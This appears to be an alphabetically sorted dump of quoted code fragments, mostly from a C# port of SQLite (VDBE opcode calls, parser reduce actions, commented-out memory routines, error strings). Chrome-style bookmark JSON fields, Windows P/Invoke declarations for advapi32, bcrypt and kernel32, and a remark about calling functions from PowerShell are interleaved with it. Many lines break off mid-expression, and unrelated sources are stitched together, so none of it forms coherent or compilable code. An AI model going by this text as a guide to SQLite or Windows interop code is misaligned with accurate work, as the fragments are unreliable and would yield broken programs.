"          sqlite3VdbeAddOp4( v, OP_VDestroy, iDb, 0, 0, pTab.zName, 0 )"
"          sqlite3VdbeAddOp4( v, op, iIdxCur, addrNxt, regBase,"
"          sqlite3VdbeChangeEncoding( pRec, SQLITE_UTF8 )"
"          sqlite3VdbeChangeEncoding( pVal, enc )"
"          sqlite3VdbeChangeP1( v, addr "
"          sqlite3VdbeChangeP1( v, addr, iDb )"
"          sqlite3VdbeChangeP1( v, iRetInit, sqlite3VdbeCurrentAddr( v ) )"
"          sqlite3VdbeChangeP4( v, -1, pValue, P4_MEM )"
"          sqlite3VdbeChangeP5( v, (u8)( endEq != bRev "
"          sqlite3VdbeChangeP5( v, 1 )"
"          sqlite3VdbeChangeP5( v, OPFLAG_USESEEKRESULT )"
"          sqlite3VdbeChangeP5( v, SQLITE_AFF_NUMERIC "
"          sqlite3VdbeChangeP5( v, SQLITE_JUMPIFNULL )"
"          sqlite3VdbeChangeP5( v, pLevel.p5 )"
"          sqlite3VdbeChangeToNoop( v, addrSortIndex, 1 )"
"          sqlite3VdbeFreeCursor( p, pC )"
"          sqlite3VdbeJumpHere( v, addr )"
"          sqlite3VdbeJumpHere( v, addr1 )"
"          sqlite3VdbeJumpHere( v, addrIf )"
"          sqlite3VdbeJumpHere( v, iAddr )"
"          sqlite3VdbeJumpHere( v, iEndAfterTrigger )"
"          sqlite3VdbeJumpHere( v, iEndBeforeTrigger )"
"          sqlite3VdbeJumpHere( v, j1 )"
"          sqlite3VdbeJumpHere( v, j3 )"
"          sqlite3VdbeJumpHere( v, pParse.cookieGoto - 1 )"
"          sqlite3VdbeJumpHere( v, topOfLoop "
"          sqlite3VdbeMemCopy( pBest, pArg )"
"          sqlite3VdbeMemFinalize( p, p.u.pDef )"
"          sqlite3VdbeMemGrow( pMem, nByte, 0 )"
"          sqlite3VdbeMemSetInt64( pVal, (i64)pExpr.u.iValue )"
"          sqlite3VdbeMemSetStr( pMem, z, -1, SQLITE_UTF8, null )"
"          sqlite3VdbeMemStringify( pRec, enc )"
"          sqlite3VdbePrintOp( Console.Out, i, p.aOp[i] )"
"          sqlite3VdbePrintOp( p.trace, pc, pOp )"
"          sqlite3VdbeResolveLabel( pParse.pVdbe, endTrigger )"
"          sqlite3VdbeResolveLabel( v, addr )"
"          sqlite3VdbeResolveLabel( v, addrNext )"
"          sqlite3VdbeResolveLabel( v, addrOutputRow )"
"          sqlite3VdbeResolveLabel( v, addrReset )"
"          sqlite3VdbeResolveLabel( v, iLoopBody )"
"          sqlite3VdbeResolveLabel( v, pLevel.addrNxt )"
"          sqlite3VdbeSetColName( pParse.pVdbe, i - iFirst, COLNAME_NAME,"
"          sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""cache_size"", SQLITE_STATIC )"
"          sqlite3VdbeSetColName( v, i, COLNAME_NAME, zName, SQLITE_TRANSIENT )"
"          sqlite3VdbeSetColName( v, i, COLNAME_NAME,"
"          sqlite3VdbeSetNumCols( pParse.pVdbe, 3 )"
"          sqlite3VdbeSetNumCols( pParse.pVdbe, 8 )"
"          sqlite3VdbeSetNumCols( v, 1 )"
"          sqlite3VdbeUsesBtree( v, i )"
"          sqlite3VdbeUsesBtree( v, iDb )"
"          sqlite3WalkSelect( pWalker, pSel )"
"          sqlite3_query_plan.Append( "" "" )"
"          sqlite3_query_plan.Append( """
"          sqlite3_query_plan.Append( ""{} "" )"
"          sqlite3_randomness( sizeof( u32 ), ref iRandom )"
"          sqlite3_randomness( sizeof( u8 ), ref _p )"
"          sqlite3_result_double( context, p.rSum )"
"          sqlite3_result_error( context, ""integer overflow"", -1 )"
"          sqlite3_result_error( context, ""x_count totals to 42"", -1 )"
"          sqlite3_result_error( context,"
"          sqlite3_result_int64( context, p.iSum )"
"          sqlite3_result_text( context, sqlite3StrAccumFinish( pAccum ), -1,"
"          sqlite3_result_value( context, argv[i] )"
"          sqlite3_result_value( context, pRes )"
"          sqlite3_snprintf( 100, ref zCsr, """
"          sqlite3_snprintf( 100, ref zCsr, ""%02X"", ( (int)pMem.zBLOB[i] "
"          substExprList( db, pExpr.x.pList, iTable, pEList )"
"          substExprList( db, pParent.pGroupBy, iParent, pSub.pEList )"
"          substExprList( db, pParent.pOrderBy, iParent, pSub.pEList )"
"          substSelect( db, pExpr.x.pSelect, iTable, pEList )"
"          substSelect( db, pItem.pSelect, iTable, pEList )"
"          szCell[nCell] = cellSizePtr(pOld, iFOFC)"
"          szNew[i] = cellSizePtr(pParent, apDiv[i])"
"          the function ""func"".  Returns -1 on a error."
"          tname.z = zSql.Substring( zCsr, len )"
"          u16 next, size"
"          u8[] aStart = new u8[] { OP_Rewind, OP_Last }"
"          u8[] aStep = new u8[] { OP_Next, OP_Prev }"
"          updateAccumulator( pParse, sAggInfo )"
"          va_start( ap, zFormat )"
"          we reference multiple rows using a ""rowid IN (...)"""
"          whenExpr = sqlite3ExprDup( db, p.pWhen, 0 )"
"          whereAndInfoDelete( db, a.u.pAndInfo )"
"          whereOrInfoDelete( db, a.u.pOrInfo )"
"          while ( ( c = sqlite3Utf8Read( zPattern, ref zPattern ) ) == matchAll"
"          while ( ( c2 = sqlite3Utf8Read( zString, ref zString ) ) != 0 )"
"          width = (int)va_arg( ap, ""int"" )"
"          x = get2byte(data, pnext)"
"          yy_destructor(yypParser, (YYCODETYPE)yymajor, yyminorunion)"
"          yy_reduce(yypParser, yyact - YYNSTATE)"
"          yy_shift(yypParser, yyact, yygoto, yygotominor)"
"          yy_shift(yypParser, yyact, yymajor, yyminorunion)"
"          z = sqlite3NameFromToken( db, pName1 )"
"          z = sqlite3NameFromToken( db, pTableName )"
"          z = sqlite3VMPrintf( db, zFormat, ap )"
"          zErrDyn = sqlite3MPrintf( db, ""database %s is already in use"", zName )"
"          zErrDyn = sqlite3MPrintf( db, ""out of memory"" )"
"          zErrDyn = sqlite3MPrintf( db, ""unable to open database: %s"", zFile )"
"          zErrDyn = sqlite3MPrintf( db,"
"          zExtra = new StringBuilder( zColl.Substring( 0, nColl ) )"
"          zMaster = sqlite3MPrintf( db, ""%s-mj%08X"", zMainFile, iRandom "
"          zMsg = sqlite3MPrintf( db, ""TABLE %s"", pItem.zName )"
"          zPrefix = """""
"          zStmt = createTableStmt( db, p )"
"          zStmt = sqlite3MPrintf( db, ""CREATE%s INDEX %."
"          zStmt = sqlite3MPrintf( db,"
"          zType = ""table"""
"          zType = ""view"""
"          zType2 = ""TABLE"""
"          zType2 = ""VIEW"""
"          { if ( !Double.TryParse( z.Substring( 0, zDx ), out v1 ) ) v1 = 0"
"          { spanBinaryExpr(yygotominor.yy346, pParse, yymsp[-1].major, yymsp[-2].minor.yy346, yymsp[0].minor.yy346)"
"          { spanExpr(yygotominor.yy346, pParse, TK_ID, yymsp[0].minor.yy0)"
"          { spanExpr(yygotominor.yy346, pParse, yymsp[0].major, yymsp[0].minor.yy0)"
"          { spanUnaryPostfix(yygotominor.yy346, pParse, TK_ISNULL, yymsp[-2].minor.yy346, yymsp[0].minor.yy0)"
"          { spanUnaryPostfix(yygotominor.yy346, pParse, TK_NOTNULL, yymsp[-2].minor.yy346, yymsp[0].minor.yy0)"
"          { spanUnaryPostfix(yygotominor.yy346, pParse, TK_NOTNULL, yymsp[-3].minor.yy346, yymsp[0].minor.yy0)"
"          { spanUnaryPostfix(yygotominor.yy346, pParse, yymsp[0].major, yymsp[-1].minor.yy346, yymsp[0].minor.yy0)"
"          { spanUnaryPrefix(yygotominor.yy346, pParse, TK_UMINUS, yymsp[0].minor.yy346, yymsp[-1].minor.yy0)"
"          { spanUnaryPrefix(yygotominor.yy346, pParse, TK_UPLUS, yymsp[0].minor.yy346, yymsp[-1].minor.yy0)"
"          { spanUnaryPrefix(yygotominor.yy346, pParse, yymsp[-1].major, yymsp[0].minor.yy346, yymsp[-1].minor.yy0)"
"          { sqlite3AddCheckConstraint(pParse, yymsp[-1].minor.yy346.pExpr)"
"          { sqlite3AddCheckConstraint(pParse, yymsp[-2].minor.yy346.pExpr)"
"          { sqlite3AddCollateType(pParse, yymsp[0].minor.yy0)"
"          { sqlite3AddColumnType(pParse, yymsp[0].minor.yy0)"
"          { sqlite3AddDefaultValue(pParse, yymsp[-1].minor.yy346)"
"          { sqlite3AddDefaultValue(pParse, yymsp[0].minor.yy346)"
"          { sqlite3AddNotNull(pParse, yymsp[0].minor.yy328)"
"          { sqlite3AddPrimaryKey(pParse, 0, yymsp[-1].minor.yy328, yymsp[0].minor.yy328, yymsp[-2].minor.yy328)"
"          { sqlite3AddPrimaryKey(pParse, yymsp[-3].minor.yy14, yymsp[0].minor.yy328, yymsp[-2].minor.yy328, 0)"
"          { sqlite3Analyze(pParse, 0, 0)"
"          { sqlite3Analyze(pParse, yymsp[-1].minor.yy0, yymsp[0].minor.yy0)"
"          { sqlite3BeginParse(pParse, 0)"
"          { sqlite3BeginParse(pParse, 1)"
"          { sqlite3BeginParse(pParse, 2)"
"          { sqlite3BeginTransaction(pParse, yymsp[-1].minor.yy328)"
"          { sqlite3CreateForeignKey(pParse, 0, yymsp[-2].minor.yy0, yymsp[-1].minor.yy14, yymsp[0].minor.yy328)"
"          { sqlite3CreateIndex(pParse, 0, 0, 0, 0, yymsp[0].minor.yy328, 0, 0, 0, 0)"
"          { sqlite3CreateIndex(pParse, 0, 0, 0, yymsp[-2].minor.yy14, yymsp[0].minor.yy328, 0, 0, 0, 0)"
"          { sqlite3DeferForeignKey(pParse, yymsp[0].minor.yy328)"
"          { sqlite3DropIndex(pParse, yymsp[0].minor.yy65, yymsp[-1].minor.yy328)"
"          { sqlite3Insert(pParse, yymsp[-2].minor.yy65, 0, yymsp[0].minor.yy3, yymsp[-1].minor.yy408, yymsp[-4].minor.yy186)"
"          { sqlite3Insert(pParse, yymsp[-3].minor.yy65, 0, 0, yymsp[-2].minor.yy408, yymsp[-5].minor.yy186)"
"          { sqlite3Insert(pParse, yymsp[-5].minor.yy65, yymsp[-1].minor.yy14, 0, yymsp[-4].minor.yy408, yymsp[-7].minor.yy186)"
"          { sqlite3Pragma(pParse, yymsp[-1].minor.yy0, yymsp[0].minor.yy0, 0, 0)"
"          { sqlite3Pragma(pParse, yymsp[-3].minor.yy0, yymsp[-2].minor.yy0, yymsp[0].minor.yy0, 0)"
"          { sqlite3Pragma(pParse, yymsp[-3].minor.yy0, yymsp[-2].minor.yy0, yymsp[0].minor.yy0, 1)"
"          { sqlite3Pragma(pParse, yymsp[-4].minor.yy0, yymsp[-3].minor.yy0, yymsp[-1].minor.yy0, 0)"
"          { sqlite3Pragma(pParse, yymsp[-4].minor.yy0, yymsp[-3].minor.yy0, yymsp[-1].minor.yy0, 1)"
"          { sqlite3Reindex(pParse, 0, 0)"
"          { sqlite3Reindex(pParse, yymsp[-1].minor.yy0, yymsp[0].minor.yy0)"
"          { sqlite3VtabArgExtend(pParse, yymsp[0].minor.yy0)"
"          { sqlite3VtabFinishParse(pParse, 0)"
"          { sqlite3VtabFinishParse(pParse, yymsp[0].minor.yy0)"
"          { yygotominor.yy14 = sqlite3ExprListAppend(pParse, 0, yymsp[0].minor.yy346.pExpr)"
"          { yygotominor.yy14 = sqlite3ExprListAppend(pParse, yymsp[-2].minor.yy14, yymsp[0].minor.yy346.pExpr)"
"          { yygotominor.yy328 = sqlite3JoinType(pParse, yymsp[-1].minor.yy0, 0, 0)"
"          { yygotominor.yy328 = sqlite3JoinType(pParse, yymsp[-2].minor.yy0, yymsp[-1].minor.yy0, 0)"
"          { yygotominor.yy328 = sqlite3JoinType(pParse, yymsp[-3].minor.yy0, yymsp[-2].minor.yy0, yymsp[-1].minor.yy0)"
"          { yygotominor.yy408 = sqlite3IdListAppend(pParse.db, 0, yymsp[0].minor.yy0)"
"          { yygotominor.yy408 = sqlite3IdListAppend(pParse.db, yymsp[-2].minor.yy408, yymsp[0].minor.yy0)"
"          { yygotominor.yy473 = sqlite3TriggerDeleteStep(pParse.db, yymsp[-2].minor.yy0, yymsp[0].minor.yy132)"
"          { yygotominor.yy473 = sqlite3TriggerInsertStep(pParse.db, yymsp[-2].minor.yy0, yymsp[-1].minor.yy408, 0, yymsp[0].minor.yy3, yymsp[-4].minor.yy186)"
"          { yygotominor.yy473 = sqlite3TriggerInsertStep(pParse.db, yymsp[-5].minor.yy0, yymsp[-4].minor.yy408, yymsp[-1].minor.yy14, 0, yymsp[-7].minor.yy186)"
"          { yygotominor.yy473 = sqlite3TriggerSelectStep(pParse.db, yymsp[0].minor.yy3)"
"          { yygotominor.yy473 = sqlite3TriggerUpdateStep(pParse.db, yymsp[-4].minor.yy0, yymsp[-1].minor.yy14, yymsp[0].minor.yy132, yymsp[-5].minor.yy186)"
"          { yygotominor.yy65 = sqlite3SrcListAppend(pParse.db, 0, yymsp[-1].minor.yy0, yymsp[0].minor.yy0)"
"          {//, pItem"
"          }          //sqlite3DbFree( db, ref zErr )"
"         ""SET type='table', name=%Q, tbl_name=%Q, rootpage=0, sql=%Q """
"         ""children"": [  ],"
"         ""children"": [ {"
"         ""date_added"": ""13236861618031351"","
"         ""date_added"": ""13236861618031378"","
"         ""date_added"": ""13236861618031381"","
"         ""date_modified"": ""0"","
"         ""date_modified"": ""13236861887917624"","
"         ""guid"": ""00000000-0000-4000-a000-000000000002"","
"         ""guid"": ""00000000-0000-4000-a000-000000000003"","
"         ""guid"": ""00000000-0000-4000-a000-000000000004"","
"         ""id"": ""1"","
"         ""id"": ""2"","
"         ""id"": ""3"","
"         ""name"": """
"         ""type"": ""folder"""
"         If found, expand each """
"         If there are no inequality constraints, then N is at"
"         ProcessAccessFlags processAccess,"
"         The z<10 term of the following cannot be used, only"
"         backup, "
"         bool bInheritHandle,"
"         constraints but an index is selected anyway, in order"
"         defines FROM clause.  When views appear in the FROM clause,"
"         for instances of the """
"         includes printf, fprintf, sprintf, vprintf, vfprintf, and"
"         index is on (x,y,z), then the following clauses are all"
"         inequality constraints (>, <, >= or <=) on the indexed"
"         sqlite3SrcListAppend(D,A,0,C)"
"         sqlite3SrcListAppend(D,A,B,0)"
"         sqlite3SrcListAppend(D,A,B,C)"
"         terms (""=="" or ""IN"" operators) that refer to the N"
"         the data between the two databases, and finally"
"         use the ""=="" and ""IN"" operators. For example, if the"
"         } ],"
"        "" do not have the same number of result columns"", selectOpName( p.op ) )"
"        "" trigger on table: %S"", pTableName, 0 )"
"        ""%T %T%s%T"", pA, pB, zSp, pC )"
"        ""Bad ptr map entry key=%d expected=(%d,%d) got=(%d,%d)"","
"        ""CREATE TABLE %Q.sqlite_stat1(tbl,idx,stat)"","
"        ""Cannot add a NOT NULL column with default value NULL"" )"
"        ""DELETE FROM %Q.%s WHERE name=%Q"","
"        ""DELETE FROM %Q.%s WHERE tbl_name=%Q and type!='trigger'"","
"        ""DELETE FROM %Q.sqlite_stat1 WHERE tbl=%Q"","
"        ""Expression tree is too large (maximum depth %d)"", mxHeight"
"        ""INSERT INTO %Q.%s VALUES('index',%Q,%Q,"
"        ""INSERT INTO %Q.%s VALUES('trigger',%Q,%Q,0,'CREATE TRIGGER %q')"","
"        ""INTEGER PRIMARY KEY"" )"
"        ""On page %d at right child: "", iPage)"
"        ""On tree page %d cell %d: "", iPage, i)"
"        ""Outstanding page count goes from %d to %d during this analysis"","
"        ""PRIMARY KEY must be unique"", P4_STATIC )"
"        ""RIGHT and FULL OUTER JOINs are not currently supported"" )"
"        ""SELECT name, rootpage, sql FROM '%q'.%s"","
"        ""SET type='%s', name=%Q, tbl_name=%Q, rootpage="
"        ""UPDATE "
"        ""UPDATE %Q.%s "" "
"        ""UPDATE sqlite_temp_master SET "" "
"        ""WHERE %s"
"        ""WHERE rowid="
"        ""WHERE type = 'table' AND name = %Q"","
"        ""a SELECT that is part of an expression"" )"
"        ""btreeInitPage() returns error code %d"", rc)"
"        ""cannot DETACH database within transaction"" )"
"        ""columns in the referenced table"" )"
"        ""indexed columns are not unique"", P4_STATIC )"
"        ""number of columns in foreign key does not match the number of "" "
"        ""or PRIMARY KEY constraint cannot be dropped"", 0 )"
"        ""sql = sqlite_rename_trigger(sql, %Q), "" "
"        ""sql = substr(sql,1,%d) "
"        ""table "
"        ""table %S has %d columns but %d values were supplied"","
"        ""tbl_name = %Q "" "
"        ""there is already another table or index with this name: %s"", zName )"
"        ""unable to close due to unfinalised statements"" )"
"        ""unable to get the page. error code=%d"", rc)"
"        ""unable to open shared library [%s]"", zFile )"
"        ( nConstraint ), P4_INT32 )"
"        (PTRMAP_PAGENO(pBt, i) != i "
"        (PTRMAP_PAGENO(pBt, i) == i "
"        (get2byte(apNew[0].aData, 5) - apNew[0].cellOffset - apNew[0].nCell "
"        //     sqlite3DbMallocSize( db, pMem.zMalloc ) )"
"        //    nGot = (sqlite3DbMallocSize(db, pNew) - sizeof("
"        //    p.pFree = sqlite3DbMallocZero( db, nByte )"
"        //    pPager->aSavepoint, sizeof(PagerSavepoint)"
"        //    sqlite3ExprDelete(db, ref p)"
"        //    sqlite3StatusAdd(SQLITE_STATUS_MEMORY_USED, -iSize)"
"        //    sqlite3StatusAdd(SQLITE_STATUS_SCRATCH_OVERFLOW, -iSize)"
"        //   NULL,"
"        //   dwCreationDisposition,"
"        //   dwDesiredAccess,"
"        //   dwFlagsAndAttributes,"
"        //   dwShareMode,"
"        //   memcpy(pzErrMsg, sqlite3_errmsg(db), nErrMsg)"
"        //  //sqlite3DbFree( db, zName )"
"        //  //sqlite3DbFree(db, pOld)"
"        //  //sqlite3DbFree(db,ref  zExtra)"
"        //  //sqlite3DbFree(db,ref z)"
"        //  //sqlite3DbFree(pMem->db,ref pMem.zMalloc)"
"        //  aNew = sqlite3_realloc(wsdAutoext.aExt, nByte)"
"        //  memcpy( z1, z2, n "
"        //  memset(p, 0, n)"
"        //  sqlite3Error( db, SQLITE_OK, 0 )"
"        //  sqlite3Error( db, p.rc, 0 )"
"        //  sqlite3Error( pDestDb, SQLITE_NOMEM, 0 )"
"        //  sqlite3SelectDelete( db, ref pDup )"
"        //  sqlite3StatusAdd(SQLITE_STATUS_SCRATCH_USED, -1)"
"        // Now I will create functions that use the above definitions, so we can use them directly from PowerShell :P"
"        // PAGE_TO_PGHDR1( pCache, pPg )"
"        // memset( p, 0, sizeof( sqlite3_backup ) )"
"        // sqlite3DbRealloc(db, pSrc,"
"        // sqlite3DbStrDup( db, pCol.zName )"
"        // sqlite3_snprintf(pVfs.mxPathname, zFull, ""%s"", zOut)"
"        /// <param name=""DatabaseName"">Name (and path) to SQLite database file</param>"
"        /// <param name=""DatabaseName"">Name of database file</param>"
"        /// <param name=""query""></param>"
"        /// Executes query that does not return anything (e.g. UPDATE, INSERT, DELETE)."
"        //GetFullPathNameA( zConverted, nByte, zTemp, 0)"
"        //a = sqlite3DbRealloc(db, pList.a, n"
"        //aNew = sqlite3DbRealloc(db,p.aCol,(p.nCol"
"        //for(j=end, ptr="
"        //fprintf(yyTraceFILE, ""%sStack Overflow!"
"        //if ( sqlite3VdbeMemGrow( pMem, pMem.n "
"        //memcpy( apNew[nNew - 1].aData[8], zChild, 4 )"
"        //memcpy(pOld, apOld[i], sizeof(MemPage))"
"        //memcpy(pOld.aData, apOld[i].aData, pBt.pageSize)"
"        //memcpy(pPager.zFilename, zPathname, nPathname)"
"        //memcpy(pPager.zJournal, zPathname, nPathname)"
"        //memcpy(pWC.a, pOld, sizeof(pWC.a[0])"
"        //memset( pMem.z, 0, nByte )"
"        //memset(apNew, 0, sizeof(PgHdr1 "
"        //memset(hit, 1, contentOffset)"
"        //memset(p, 0, n)"
"        //memset(pCache, 0, sizeof(PCache1))"
"        //memset(zCsr, 0, zEnd-zCsr)"
"        //nByte = GetFullPathNameA(zConverted, 0, 0, 0) "
"        //nByte = GetFullPathNameW( zConverted, 0, 0, 0) "
"        //p.aLabel = sqlite3DbReallocOrFree(p.db, p.aLabel,"
"        //pNew = sqlite3DbRealloc(db, pArray, newSize "
"        //pWC.a = sqlite3DbMallocRaw(db, sizeof(pWC.a[0])"
"        //pWC.nSlot = sqlite3DbMallocSize(db, pWC.a)/sizeof(pWC.a[0])"
"        //res = LockFile(pFile.fs.SafeFileHandle.DangerousGetHandle().ToInt32(), SHARED_FIRST, 0, SHARED_SIZE, 0)"
"        //sqlite3DbFree( db, pItem.zSpan )"
"        //sqlite3DbFree( db, pWInfo )"
"        //sqlite3DbFree( db, ref  azCols )"
"        //sqlite3DbFree( db, ref  pDef )"
"        //sqlite3DbFree( db, ref  zErrMsg )"
"        //sqlite3DbFree( db, ref  zExternal )"
"        //sqlite3DbFree( db, ref p )"
"        //sqlite3DbFree( db, ref p.contextStack )"
"        //sqlite3DbFree( db, ref p.zErrMsg )"
"        //sqlite3DbFree( db, ref pColl )"
"        //sqlite3DbFree( db, ref pIndex )"
"        //sqlite3DbFree( db, ref pItem.zAlias )"
"        //sqlite3DbFree( db, ref pItem.zDatabase )"
"        //sqlite3DbFree( db, ref pItem.zIndex )"
"        //sqlite3DbFree( db, ref pItem.zName )"
"        //sqlite3DbFree( db, ref pKeyInfo )"
"        //sqlite3DbFree( db, ref pList.a[i].zName )"
"        //sqlite3DbFree( db, ref pNew )"
"        //sqlite3DbFree( db, ref pTmp )"
"        //sqlite3DbFree( db, ref pWC.a )"
"        //sqlite3DbFree( db, ref z )"
"        //sqlite3DbFree( db, ref zCol )"
"        //sqlite3DbFree( db, ref zColl )"
"        //sqlite3DbFree( db, ref zErrDyn )"
"        //sqlite3DbFree( db, ref zErrMsg )"
"        //sqlite3DbFree( db, ref zErrmsg )"
"        //sqlite3DbFree( db, ref zMaster )"
"        //sqlite3DbFree( db, ref zSql )"
"        //sqlite3DbFree( db, ref zStmt )"
"        //sqlite3DbFree( db, ref zWhere )"
"        //sqlite3DbFree( p.db, ref p.zText )"
"        //sqlite3DbFree( p.db, ref pChunk )"
"        //sqlite3DbFree( p.db, ref pCx.pData )"
"        //sqlite3DbFree(db,ref db.aDb)"
"        //sqlite3DbFree(db,ref pz)"
"        //sqlite3DbFree(pMem.db,ref pMem.zMalloc)"
"        //sqlite3DbReallocOrFree(pParse.db, pLevel.u._in.aInLoop,"
"        //sqlite3Error(db, SQLITE_NOMEM, 0)"
"        //sqlite3StackFree( db, zErrmsg )"
"        //while ( z != """" "
"        //z1 = contextMalloc(context, ((i64)n)"
"        //zTemp = GetFullPathNameW(zConverted, nByte, zTemp, 0)"
"        0, (dxFunc)sqlite3InvalidFunction, null, null )"
"        0, SQLITE_DYNAMIC )"
"        Array.Clear( pBuf, (int)got, (int)( amt - got ) )"
"        Array.Copy( db.aDb, db.aDbStatic, 2 )"
"        Array.Copy( p.u.aHash, aiValues, p.u.aHash.Length )"
"        Array.Copy( s, cp.s, s.Length )"
"        Array.Resize( ref p.aCol, p.nCol "
"        Array.Resize( ref p.aLabel, n )"
"        Array.Resize( ref pArray, newSize )"
"        Array.Resize( ref pList.a, n )"
"        Array.Resize( ref pPager.aSavepoint, nSavepoint )"
"        Array.Resize( ref pSrc.a, nAlloc )"
"        Array.Resize( ref pWC.a, pWC.nSlot "
"        Array.Resize( ref wsdAutoext.aExt, wsdAutoext.nExt "
"        Bitmask x = getMask( pMaskSet, pExpr.iRightJoinTable )"
"        Buffer.BlockCopy( aData, 0, pData, 0, pPager.pageSize )"
"        Buffer.BlockCopy( pChunk.zChunk, iChunkOffset, zOut, izOut, nCopy )"
"        Buffer.BlockCopy( pCur.info.pCell, outOffset, aPayload, 0, (int)( pCur.info.nSize - pCur.info.nHeader - nKey ) )"
"        Buffer.BlockCopy( pCur.info.pCell, outOffset, aPayload, 0, pCur.info.nSize - pCur.info.nHeader )"
"        Buffer.BlockCopy( pPg.pData, 24, pPager.dbFileVers, 0, pPager.dbFileVers.Length )"
"        Buffer.BlockCopy( zData, offset, pMem.zBLOB, 0, amt )"
"        Buffer.BlockCopy( zWrite, izWrite, p.endpoint.pChunk.zChunk, iChunkOffset, iSpace )"
"        Buffer.BlockCopy(aFrom, iData, aTo, iData, pBt.usableSize - iData)"
"        Buffer.BlockCopy(aFrom, iFromHdr, aTo, iToHdr, pFrom.cellOffset "
"        Buffer.BlockCopy(apCell, 0, data, cellbody, aSize[i])"
"        Buffer.BlockCopy(apCopy[nOld - 1].aData, 8, apNew[nNew - 1].aData, 8, 4)"
"        Buffer.BlockCopy(pBuf, (int)pBufOffset, pPayload, (int)payloadOffset, (int)nByte)"
"        Buffer.BlockCopy(pCell, nSkip, data, idx "
"        Buffer.BlockCopy(pLeaf.aData, pCell - 4, pNext_4, 0, nCell "
"        Buffer.BlockCopy(pPage.aData, iCell, pCell, 0, pCell.Length)"
"        Buffer.BlockCopy(pPage.aData, iCell, pCell, 0, pPage.aData.Length - iCell)"
"        Buffer.BlockCopy(pPayload, (int)payloadOffset, pBuf, (int)pBufOffset, (int)nByte)"
"        Buffer.BlockCopy(temp, pc, data, cbrk, size)"
"        CODEC2( pPager, pData, pPg.pgno, 7, SQLITE_NOMEM, ref pData2 )"
"        CollSeq p = sqlite3GetCollSeq( pParse.db, pColl, zName )"
"        Console.Write( ""SQL: [%s]"
"        Console.Write( ""VDBE Program Listing:"
"        DbSetProperty( db, iDb, DB_Empty )"
"        DbSetProperty( db, iDb, DB_SchemaLoaded )"
"        Debug.Assert( !ExprHasAnyProperty( p, EP_TokenOnly "
"        Debug.Assert( !ExprHasAnyProperty( pE, EP_TokenOnly "
"        Debug.Assert( !ExprHasProperty( p, EP_FromJoin ) )"
"        Debug.Assert( !ExprHasProperty( pExpr, EP_IntValue ) )"
"        Debug.Assert( !ExprHasProperty( pF.pExpr, EP_xIsSelect ) )"
"        Debug.Assert( ExprHasAnyProperty( p, EP_Reduced "
"        Debug.Assert( iDb == sqlite3SchemaToIndex( pParse.db, pIdx.pSchema ) )"
"        Debug.Assert(get2byte(aFrom, iFromHdr "
"        Debug.Assert(sqlite3Get4byte(pParent.aData, findCell(pParent, iIdx)) == iChild)"
"        Debug.Assert(sqlite3Get4byte(pParent.aData, pParent.hdrOffset "
"        EXTRA_SIZE, flags, vfsFlags, pageReinit)"
"        Expr pLeft, pRight"
"        Expr pNew = sqlite3ExprAlloc( db, TK_AND, null, 0 )"
"        Expr pNewExpr1, pNewExpr2"
"        Expr pStr1, pStr2"
"        ExprSetProperty( p, EP_FromJoin )"
"        ExprSetProperty( pE, EP_FromJoin )"
"        ExprSetProperty( pExpr, EP_Agg )"
"        ExprSetProperty( pExpr, EP_Error )"
"        FuncDef pNext, pHash, p"
"        IOTRACE( ""CLEAN %p %d"
"        IOTRACE( ""DBHDR %p 0 %d"
"        IOTRACE( ""DBSYNC %p"
"        IOTRACE( ""JHDR %p %lld %d"
"        IOTRACE( ""JZEROHDR %p"
"        IOTRACE( ""UNLOCK %p"
"        KeyInfo pKey = sqlite3IndexKeyinfo( pParse, pIdx )"
"        LastError = ""Error "" "
"        MemSetTypeFlag( pMem, MEM_Null )"
"        MemSetTypeFlag( pMem, MEM_Real )"
"        OSTRACE2( ""unreadlock = %d"
"        OSTRACE3( ""TEST WR-LOCK %d %d (local)"
"        OSTRACE3( ""TEST WR-LOCK %d %d (remote)"
"        OSTRACE4( ""LOCK FAILED %d trying for %d but got %d"
"        PAGERTRACE( ""DONT_WRITE page %d of %d"
"        PAGERTRACE( ""STMT-JOURNAL %d page %d"
"        PAGERTRACE( ""STRESS %d page %d"
"        Pgno childPgno = sqlite3Get4byte(pPage.aData, pPage.hdrOffset "
"        Pgno ovfl = sqlite3Get4byte(pCell, info.iOverflow)"
"        Pgno ovfl = sqlite3Get4byte(pPage.aData, pCell, info.iOverflow)"
"        RowSetEntry pHead = new RowSetEntry(), pTail = new RowSetEntry()"
"        SQLITE_OK == sqlite3RunParser(pParse, zCreateTable, "
"        String zStmt = """""
"        String zType = """""
"        String zType2 = """""
"        TRACE(""ALLOCATE: %d from end of file"
"        TRACE(""PTRMAP_UPDATE: %d->(%d,%d)"
"        TRIGGER_AFTER, pTab, -1, oldIdx, orconf, addr, ref old_col_mask, ref Ref_0 )"
"        TRIGGER_BEFORE, pTab, -1, oldIdx, orconf, addr, ref old_col_mask, ref Ref_0 )"
"        TRIGGER_BEFORE, pTab, newIdx, oldIdx, onError, addr,"
"        VdbeComment( v, ""%s"", pDestIdx.zName )"
"        VdbeComment( v, ""%s"", pIdx.zName )"
"        VdbeComment( v, ""%s"", pSrcIdx.zName )"
"        VdbeComment( v, ""%s.%s"", pTab.zName, pCol.zName )"
"        VdbeComment( v, ""End of SELECT coroutine"" )"
"        VdbeComment( v, ""Jump over SELECT coroutine"" )"
"        VdbeComment( v, ""LIMIT counter"" )"
"        VdbeComment( v, ""SELECT eof flag"" )"
"        VdbeComment( v, ""init LEFT JOIN no-match flag"" )"
"        VdbeComment( v, ""pk"" )"
"        VdbeComment( v, ""record LEFT JOIN hit"" )"
"        VdbeComment( v, ""skip OFFSET records"" )"
"        VdbeNoopComment( v, ""A-eq-B subroutine"" )"
"        VdbeNoopComment( v, ""Output routine for B"" )"
"        VdbeNoopComment( v, ""eof-B subroutine"" )"
"        VdbeOp pOp = sqlite3VdbeGetOp( v, i )"
"        WHERETRACE( """
"        WHERETRACE( ""... index %s:"
"        WHERETRACE( ""... table scan _base cost: %.9g"
"        WHERETRACE( ""...... nEq=%d inMult=%.9g nRow=%.9g cost=%.9g"
"        WhereTerm pStart, pEnd"
"        [DllImport(""advapi32.dll"")]"
"        [DllImport(""advapi32.dll"", CharSet = CharSet.Auto, SetLastError = true)]"
"        [DllImport(""advapi32.dll"", SetLastError = true)]"
"        [DllImport(""bcrypt.dll"")]"
"        [DllImport(""bcrypt.dll"", EntryPoint = ""BCryptGetProperty"")]"
"        [DllImport(""bcrypt.dll"", EntryPoint = ""BCryptSetProperty"")]"
"        [DllImport(""kernel32.dll"", SetLastError = true)]"
